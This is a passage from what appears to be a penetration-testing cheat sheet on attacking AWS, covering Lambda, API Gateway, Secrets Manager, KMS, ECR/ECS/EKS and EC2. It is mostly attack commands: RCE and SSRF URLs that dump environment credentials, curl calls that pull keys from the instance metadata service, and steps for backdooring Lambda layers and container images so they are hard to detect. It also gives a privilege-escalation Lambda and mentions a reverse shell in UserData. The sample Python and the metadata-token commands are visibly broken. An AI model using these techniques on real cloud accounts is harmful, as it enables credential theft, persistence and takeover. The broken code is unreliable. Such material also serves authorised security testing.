object</li> <li>Userful if the object is not public</li> </ul> <pre><code>aws s3 presign s3://bucket-name/object-name --expires-in 605000\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#lambda-api-gateway","title":"Lambda &amp; API Gateway","text":"<ul> <li>Serverless event driven platform</li> <li>Runs code in response to events and automatically manages computing resources required by that code</li> <li>Can trigger from other AWS services or call directly from the API Gateway</li> <li>A lambda function is a piece of code that is executed whenever is triggered by an event from an event source</li> <li>API Gateway is an AWS service for creating, publishing, maintaining, monitoring and securing REST, HTTP and WebSocket API</li> <li>API Gateway can be used to trigger lambda functions in a synchronous (api gateway), asynchronous (event) or stream (Poll Based) way.</li> <li>If we found a lambda function that access an S3 (Example) its possible to change its code and gain access to the files.</li> <li>If API Gateway is used, we can enumerate the API to see how its possible to invoke the lambda function (Craft the URL).</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#enumeration_1","title":"Enumeration","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-lambda-functions","title":"Listing All lambda functions","text":"<pre><code>aws lambda list-functions\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-a-specific-lambda-function","title":"Listing information about a specific lambda function","text":"<pre><code>aws lambda get-function --function-name function_name\n</code></pre> <ul> <li>This command enables us to download the source code of the lambda function</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-policy-information-about-the-function","title":"Listing policy information about the function","text":"<pre><code>aws lambda get-policy --function-name function_name\n</code></pre> <ul> <li>We can get informations like who can execute this functions, ID and other informations with this command</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-the-event-source-mapping-information-about-a-lambda-function","title":"Listing the event source mapping information about a lambda function","text":"<pre><code>aws lambda list-event-source-mappings --function-name function_name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-lambda-layers-depedencies","title":"Listing Lambda Layers (Depedencies)","text":"<pre><code>aws lambda list-layers\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-full-information-about-a-lambda-layer","title":"Listing full information about a lambda layer","text":"<pre><code>aws lambda get-layer-version --layer-name name --version-number version_number\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-rest-apis","title":"Listing Rest API'S","text":"<pre><code>aws apigateway get-rest-apis\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-a-specific-api","title":"Listing information about a specific API","text":"<pre><code>aws apigateway get-rest-api --rest-api-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-endpoints","title":"Listing information about endpoints","text":"<pre><code>aws apigateway get-resources --rest-api-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-a-specific-endpoint","title":"Listing information about a specific endpoint","text":"<pre><code>aws apigateway get-resource --rest-api-id ID --resource-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-method-information-for-the-endpoint","title":"Listing method information for the endpoint","text":"<pre><code>aws apigateway get-method --rest-api-id ApiID --resource-id ID --http-method method\n</code></pre> <ul> <li>Test various methods to see if the API supports it.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-versions-of-a-rest-api","title":"Listing all versions of a rest api","text":"<pre><code>aws apigateway get-stages --rest-api-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-informatin-about-a-specific-version","title":"Getting informatin about a specific version","text":"<pre><code>aws apigateway get-stage --res-api-id ID --stage-name NAME\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-api-keys","title":"Listing API KEYS","text":"<pre><code>aws apigateway get-api-keys --include-values\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-information-about-a-specific-api-key","title":"Getting information about a specific API Key","text":"<pre><code>aws apigateway get-api-key --api-key KEY\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#initial-access","title":"Initial Access","text":"<ul> <li>Its possible to get RCE through API Gateway if it executes commands.</li> <li>If you can execute commands, there is a way to retrieve keys from the API Gateway, just use <code>env</code> , configure <code>aws cli</code> and proceed with the exploitation.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#credential-access","title":"Credential Access","text":"<p>Getting credentials from Lambda can be done in 2 ways</p> <ol> <li>Keys in the source code</li> <li>Keys in the enviroment variables</li> </ol> <p>These keys can be gathered using SSRF, RCE and so on.</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-credentials-using-rce","title":"Getting credentials using RCE","text":"<pre><code>https://apigateway/prod/system?cmd=env\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-credentials-using-ssrf","title":"Getting credentials using SSRF","text":"<pre><code>https://apigateway/prod/example?url=http://localhost:9001/2018-06-01/runtime/invocation/next\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-credentials-using-ssrf-and-wrappers","title":"Getting credentials using SSRF and wrappers","text":"<pre><code>https://apigateway/prod/system?cmd=file:///proc/self/environ\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-credentials-from-lambda-enviroment-variables-cli","title":"Getting credentials from lambda enviroment variables (cli)","text":"<pre><code>aws lambda get-function --function-name NAME\n</code></pre> <ul> <li>It's important to enumerate the functions first with <code>aws lambda list-functions</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#persistence","title":"Persistence","text":"<ul> <li>If the user has sufficient rights in the lambda function, its possible to download the source code, add a backdoor to it and upload. Everytime the lambda executes, the malicious code will also execute.</li> <li>Always try to update the code of layers (depedencies) instead of the actual lambda code, this way our backdoor will be difficult to detect.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#checking-which-user-is-executing","title":"Checking which user is executing","text":"<pre><code>aws sts get-caller-identity\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#checking-all-managed-policies-attached-to-the-user","title":"Checking all managed policies attached to the user","text":"<pre><code>aws iam list-attached-user-policies --user-name user_name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#checking-informations-about-a-specific-policy","title":"Checking informations about a specific policy","text":"<pre><code>aws iam get-policy-version --policy-arn arn --version-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-lambda-functions_1","title":"Listing all lambda functions","text":"<pre><code>aws lambda list-functions --region region\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-the-specified-lambda","title":"Listing information about the specified lambda","text":"<pre><code>aws lambda get-function --function-name name\n</code></pre> <ul> <li>Download and analyze the codes</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-policy-information-about-the-specific-lambda-function","title":"Listing policy information about the specific lambda function","text":"<pre><code>aws lambda get-policy --function-name name --profile profile --region region\n</code></pre> <ul> <li>We can grab informations like id, who can invoke and other details with this command (Helps to build the query to execute the lambda function).</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-rest-apis_1","title":"Listing Rest API'S","text":"<pre><code>aws apigateway get-rest-apis\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-a-specific-api_1","title":"Listing information about a specific API","text":"<pre><code>aws apigateway get-rest-api --rest-api-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-endpoints_1","title":"Listing information about endpoints","text":"<pre><code>aws apigateway get-resources --rest-api-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-a-specific-endpoint_1","title":"Listing information about a specific endpoint","text":"<pre><code>aws apigateway get-resource --rest-api-id ID --resource-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-method-information-for-the-endpoint_1","title":"Listing method information for the endpoint","text":"<pre><code>aws apigateway get-method --rest-api-id ApiID --resource-id ID --http-method method\n</code></pre> <ul> <li>Test various methods to see if the API supports it.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-versions-of-a-rest-api_1","title":"Listing all versions of a rest api","text":"<pre><code>aws apigateway get-stages --rest-api-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-informatin-about-a-specific-version_1","title":"Getting informatin about a specific version","text":"<pre><code>aws apigateway get-stage --res-api-id ID --stage-name NAME\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#uploading-the-backdoor-code-to-aws-lambda-function","title":"Uploading the backdoor code to aws lambda function","text":"<pre><code>aws lambda update-function-code --function-name function --zip-file fileb://my-function.zip\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#invoke-the-function","title":"Invoke the Function","text":"<pre><code>curl https://uj3948ie.execute-api.us-east-2.amazonaws.com/default/EXAMPLE\n</code></pre> <p>Where</p> <ol> <li>API-ID -&gt; uj3948ie</li> <li>Region -&gt; us-east-2</li> <li>Resource (Endpoint) -&gt; EXAMPLE</li> <li>Method -&gt; Get</li> <li>Stage (Version) -&gt; default</li> <li>API-Key -&gt; None</li> </ol> <p>All these details are gathered during the enumeration.</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#privilege-escalation_1","title":"Privilege Escalation","text":"<ul> <li>If we have a user with PassRole and CreateFunction roles and also AttachRolePolicy role in a Lambda Function, its possible to create a function with a code that changes the lambda role to admin then the user to Administrator.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#create-a-lambda-function-and-attach-a-role-to-it","title":"Create a lambda function and attach a role to it","text":"<pre><code>aws lambda create-function --function-name my-function --runtime python3.7 --zip-file fileb://my-function.zip --handler my-function.handler --role ARN --region region\n</code></pre> <ul> <li>Inside the function's code, we will add the administrator permission to the role and to the user</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#example-code-to-add-the-permissions","title":"Example code to add the permissions","text":"<pre><code>import boto3\nimport json\ndef handler(event,context)\niam = boto3.client(\"iam\")\niam.attach.role.policy(RoleName=\"name\",PolicyArn=\"arn\",)\niam.attach.user.policy(UserName=\"name\",PolicyArn=\"arn\",)\nreturn {\n'statusCode':200\n'body':json.dumps(\"Pwned\")\n}\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#invoke-a-lambda-function","title":"Invoke a lambda function","text":"<pre><code>aws lambda invoke --function-name name response.json --region region \n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-managed-policies-to-see-if-the-change-worked","title":"Listing managed policies to see if the change worked","text":"<pre><code>aws iam list-attached-user-policies --user-name user_name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-secret-manager","title":"AWS Secret Manager","text":"<ul> <li>AWS Service that encrypts and store secrets</li> <li>Transparently decrypts and return in plaintext</li> <li>KMS used to store keys (AWS Key and Customer Managed Key)</li> <li>Asymmetric and Symmetric keys can be created using KMS</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#enumeration_2","title":"Enumeration","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-secrets-stored-by-secret-manager","title":"Listing all secrets stored by Secret Manager","text":"<pre><code>aws secretsmanager list-secrets\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-a-specific-secret","title":"Listing information about a specific secret","text":"<pre><code>aws secretsmanager describe-secret --secret-id name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-policies-attached-to-the-specified-secret","title":"Getting policies attached to the specified secret","text":"<pre><code>aws secretsmanager get-resource-policy --secret-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-keys-in-kms","title":"Listing keys in KMS","text":"<pre><code>aws kms list-keys\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-a-specific-key","title":"Listing information about a specific key","text":"<pre><code>aws kms describe-key --key-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-policies-attached-to-a-specific-key","title":"Listing policies attached to a specific key","text":"<pre><code>aws kms list-key-policies --key-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-full-information-about-a-policy","title":"Getting full information about a policy","text":"<ul> <li>Shows who can access the keys</li> </ul> <pre><code>aws kms get-key-policy --policy-name name --key-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#credential-exfiltration","title":"Credential Exfiltration","text":"<ul> <li>If the user has access to Secret Manager, it can decrypt the secrets using the web, cli or API</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-policies-attached-to-an-user","title":"Listing policies attached to an user","text":"<pre><code>aws iam list-attached-user-policies --user-name name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#retrieving-information-about-a-specific-version-of-policy","title":"Retrieving information about a specific version of policy","text":"<ul> <li>Here we can see the permissions</li> </ul> <pre><code>aws iam get-policy-version --policy-arn arn --version-id id\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-secrets-stored-by-secret-manager_1","title":"Listing all secrets stored by Secret Manager","text":"<pre><code>aws secretsmanager list-secrets\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-a-specific-secret_1","title":"Listing information about a specific secret","text":"<ul> <li>Here we get the secret Key Id to descript the secret</li> </ul> <pre><code>aws secretsmanager describe-secret --secret-id name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-resource-based-policy-attached-to-an-specific-secret","title":"Getting resource-based policy attached to an specific secret","text":"<pre><code>aws secretsmanager get-resource-policy --secret-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-the-secret-value","title":"Getting the secret value","text":"<ul> <li>Retrieves the actual value</li> </ul> <pre><code>aws secretsmanager get-secret-value --secret-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#kms","title":"KMS","text":"<ul> <li>If we compromised as an example an S3 with an encrypted file, we can decrypt it using the keys stored in KMS.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-an-specific-key","title":"Listing an specific key","text":"<pre><code>aws kms describe-key --key-id id\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-policies-attached-to-an-specified-key","title":"Listing policies attached to an specified key","text":"<ul> <li>Here we can see who can access the key, the description of it and so on</li> </ul> <pre><code>aws kms list-key-policies --key-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-full-information-about-a-policy","title":"Listing full information about a policy","text":"<ul> <li>Run the previous command in all keys to see who can access it</li> </ul> <pre><code>aws kms get-key-policy --policy-name name --key-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#decrypt-the-secret-using-the-key","title":"Decrypt the secret using the key","text":"<ul> <li>There is no need to specificy the key information because this information is embbeded in the encrypted file</li> </ul> <pre><code>aws kms decrypt --ciphertext-blob fileb://EncryptedFile --output text --query plaintext\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#containers","title":"Containers","text":"<p>Divided into three categories</p> <ul> <li>Registry -&gt; Secure place to store container images (ECR)</li> <li>Orchestration -&gt; Configure when and where the containters run (ECS,EKS)</li> <li>Compute -&gt; Use to do computing related tasks (EC2, Fargate)</li> <li>Its possible to create a backdoor image and add to a EKS  cluster</li> <li>Always look how VPC's are communicatig with each other, maybe is possible to pivot through the EKS VPC from other VPC and compromise the entire cluster</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#initial-access_1","title":"Initial Access","text":"<ul> <li>The initial access can be done by exploiting some RCE in webapp to get access to the container, afterwards its possible to compromise the EC2. </li> </ul> <p>After the RCE, we can list all secrets in EKS</p> <pre><code>https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-the-secret-information-from-eks","title":"Getting the secret information from EKS","text":"<pre><code>https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount/token\n</code></pre> <ul> <li>It's also possible to do sandbox escaping (Tool: <code>deepce</code>)</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#enumeration_3","title":"Enumeration","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#ecr","title":"ECR","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-repositories-in-container-registry","title":"Listing all repositories in container registry","text":"<pre><code>aws ecr describe-repositories\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-repository-policy","title":"Listing information about repository policy","text":"<pre><code>aws ecr get-repository-policy --repository-name name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-images-in-a-specific-repository","title":"Listing all images in a specific repository","text":"<pre><code>aws ecr list-images --repository-name name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-an-image","title":"Listing information about an image","text":"<pre><code>aws ecr describe-images --repository-name name --images-ids imageTag=name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#ecs","title":"ECS","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-ecs-clusters","title":"Listing all ECS clusters","text":"<pre><code>aws ecs list-clusters\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-an-specific-cluster","title":"Listing information about an specific cluster","text":"<pre><code>aws ecs describe-clusters --cluster name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-services-in-specified-cluster","title":"Listing all services in specified cluster","text":"<pre><code>aws ecs list-services --cluster name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-an-specific-service","title":"Listing information about an specific service","text":"<pre><code>aws ecs descibe-services --cluster name --services name\n</code></pre> <ul> <li>This command shows the logs of the service</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-tasks-in-specific-cluster","title":"Listing tasks in specific cluster","text":"<pre><code>aws ecs list-tasks --cluster name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-an-specific-task","title":"Listing information about an specific task","text":"<pre><code>aws ecs describe-tasks --cluster name -tasks taskArn\n</code></pre> <ul> <li>Also shows information about network, userful if trying to pivot</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-containers-in-specified-cluster","title":"Listing all containers in specified cluster","text":"<pre><code>aws ecs list-container-instances --cluster name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#eks","title":"EKS","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-eks-clusters","title":"Listing all EKS clusters","text":"<pre><code>aws eks list-clusters\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-an-specific-cluster_1","title":"Listing information about an specific cluster","text":"<pre><code>aws eks describe-cluster --name name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-node-groups-in-specified-cluster","title":"Listing all node groups in specified cluster","text":"<pre><code>aws eks list-nodegroups --cluster-name name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-specific-information-about-a-node-group-in-a-cluster","title":"Listing specific information about a node group in a cluster","text":"<pre><code>aws eks describe-nodegroup --cluster-name name --nodegroup-name name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-fargate-in-specified-cluster","title":"Listing Fargate in specified cluster","text":"<pre><code>aws eks list-fargate-profiles --cluster-name cluster-name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-a-fargate-profile-in-a-cluster","title":"Listing information about a fargate profile in a cluster","text":"<pre><code>aws eks describe-fargate-profiles --cluster-name name --fargate-profile-name name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#persistence_1","title":"Persistence","text":"<ul> <li>It's possible to modify an existing docker image with a backdoor, when this image is used it will trigger our team server.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#enumerating-the-user","title":"Enumerating the user","text":"<pre><code>aws sts get-caller-identity\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-manager-policies-attached-to-the-iam-role","title":"Listing manager policies attached to the IAM role","text":"<pre><code>aws iam list-attached-role-policies --role-name name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-information-about-the-version-of-the-managed-policy","title":"Getting information about the version of the managed policy","text":"<pre><code>aws iam get-policy-version --policy-arn arn --version-id id\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-information-about-the-repositories-in-container-registry","title":"Getting information about the repositories in container registry","text":"<pre><code>aws ecr describe-repositories\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-images-in-the-repository","title":"Listing all images in the repository","text":"<pre><code>aws ecr list-images --repository-name name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-an-image_1","title":"Listing information about an image","text":"<pre><code>aws ecr describe-images --repository-name name --image-ids imageTag=Name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#authenticate-the-docker-daemon-to-ecr","title":"Authenticate the docker daemon to ECR","text":"<pre><code>aws ecr get-login-password --region region | docker login --username AWS --password-stdin ecr_address\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#building-images-with-backdoor","title":"Building images with backdoor","text":"<pre><code>docker build -t image_name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#tagging-the-docker-image","title":"Tagging the docker image","text":"<pre><code>docker tag image_name ecr_addr:Image_Name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#pushing-the-image-to-ecr","title":"Pushing the image to ECR","text":"<pre><code>docker push ecr_addr:Image_Name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#ec2","title":"EC2","text":"<ul> <li>AMI, images used to create virtual machines</li> <li>It's possible to create a malicious image to compromise users</li> <li>We can access an instance using SSH Keys, EC2 Instance Connect, Session Manager</li> <li>The SSH Key method is permanent, we need to gather the private key to connect to the instance</li> <li>EC2 Instance connect is an IAM right that we can add to a user, enabling us to temporarily connect to an instance</li> <li>Session manager only work in browser and it does not need SSH Key</li> <li>Windows machines can be accessed by using RDP, Session Manager</li> <li>Security Groups acts as a virtual firewall to control inbound and outbound traffic, acts at the instance level, not the subnet level.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#enumeration_4","title":"Enumeration","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-all-instances","title":"Listing information about all instances","text":"<pre><code>aws ec2 describe-instances\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-a-specific-region","title":"Listing information about a specific region","text":"<pre><code>aws ec2 describe-instances --region region\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-specific-instance","title":"Listing information about specific instance","text":"<pre><code>aws ec2 describe-instances --instance-ids ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#extracting-userdata-attribute-of-specified-instance","title":"Extracting UserData attribute of specified instance","text":"<pre><code>aws ec2 describe-instance-attribute --attribute userData --instance-id instanceID\n</code></pre> <p>This command gathers the metadata from the instance, like commands or secrets. The output is base64 encoded</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-roles-of-an-instance","title":"Listing roles of an instance","text":"<pre><code>aws ec2 describe-iam-instance-profile-associations\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#exploitation_1","title":"Exploitation","text":"<ul> <li>Initial access can happen by RCE or SSRF</li> <li>Metadata can be used to exfiltrate information from the instance</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#remote-code-execution","title":"Remote code execution","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-metadata","title":"AWS Metadata","text":"<p>If we have remote code execution or SSRF, we can grab metadata information</p> <pre><code>curl http://169.254.169.254/latest/meta-data\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#grabbing-the-keys-to-access-the-instance","title":"Grabbing the keys to access the instance","text":"<pre><code>curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#grabbing-the-keys-in-metadata-version-2","title":"Grabbing the keys in metadata version 2","text":"<pre><code>TOKEN=`curl\nX PUT \"http://169.254.169.254/latest/ api /token\" H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\n&amp;&amp; curl H \"X-aws-ec2-metadata-token: $TOKEN\" v http://169.254.169.254/latest/meta-data/\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-userdata","title":"AWS Userdata","text":"<p>Version 1</p> <pre><code>curl http://169.254.169.254/latest/user-data/\n</code></pre> <p>Version 2</p> <pre><code>TOKEN=`curl\nX PUT \"http://169.254.169.254/latest/ api /token\" H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\n&amp;&amp; curl H \"X-aws-ec2-metadata-token: $TOKEN\" v http://169.254.169.254/latest/user-data/\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#privilege-escalation_2","title":"Privilege Escalation","text":"<ul> <li>One approach to get a shell in a instance is to put a reverse shell in UserData attribute, when the  instance is launched, we will have the connection.</li> <li>Another approach happens when we have the iam:PassRole and iam:AmazonEC2FullAccess permissions, we can add an administrator role to the compromised EC2 instance and access aws services.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-information-about-the-key","title":"Getting information about the key","text":"<pre><code>aws sts get-caller-identity\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-policies-attached-to-the-iam-user","title":"Getting policies attached to the IAM user","text":"<pre><code>aws iam list-attached-user-policies --user-name user_name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-information-about-a-specific-policy-version","title":"Getting information about a specific policy version","text":"<pre><code>aws iam get-policy-version --policy-arn ARN --version-id ID\n</code></pre> <p>To attach a role to an EC2 instance, we can use the RCE to grab the ID</p> <pre><code>curl http://169.254.169.254/latest/meta-data/instance-id\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-instance-profiles","title":"Listing instance profiles","text":"<pre><code>aws iam list-instance-profiles\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#attach-an-instance-profile-to-an-ec2-instance","title":"Attach an instance profile to an EC2 instance","text":"<pre><code>aws ec2 associate-iam-instance-profile --instance-id ID --iam-instance-profile Name=ProfileName\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#credential-access_1","title":"Credential Access","text":"<ul> <li>We can grab the credentials by abusing metadata (Web Application with SSRF,RCE and so on)</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#after-the-initial-access","title":"After the 